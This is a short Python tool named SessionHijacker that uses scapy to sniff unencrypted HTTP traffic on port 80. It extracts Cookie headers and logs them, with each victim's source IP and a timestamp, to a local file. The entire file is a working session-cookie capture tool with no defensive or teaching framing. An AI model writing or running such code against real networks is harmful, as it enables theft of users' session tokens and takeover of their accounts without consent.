#!/usr/bin/env python3
import os
import threading
import json
from datetime import datetime
from scapy.all import sniff, IP, TCP, Raw

class SessionHijacker:
    def __init__(self, interface):
        self.interface = interface
        self.running = False
        self.sniff_thread = None
        os.makedirs("captured_data", exist_ok=True)
        
    def extract_cookies(self, packet):
        if packet.haslayer(Raw):
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            if 'Cookie:' in payload:
                lines = payload.split('\n')
                for line in lines:
                    if line.startswith('Cookie:'):
                        data = {
                            'time': datetime.now().isoformat(),
                            'src': packet[IP].src,
                            'cookie': line.strip()
                        }
                        with open('captured_data/cookies.txt', 'a') as f:
                            f.write(json.dumps(data) + '\n')
            
    def packet_handler(self, packet):
        if self.running and packet.haslayer(IP) and packet.haslayer(TCP):
            if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                self.extract_cookies(packet)
                
    def start(self):
        self.running = True
        self.sniff_thread = threading.Thread(
            target=lambda: sniff(
                iface=self.interface,
                filter="tcp port 80",
                prn=self.packet_handler,
                store=False
            )
        )
        self.sniff_thread.daemon = True
        self.sniff_thread.start()
        
    def stop(self):
        self.running = False
        if self.sniff_thread:
            self.sniff_thread.join(timeout=2)
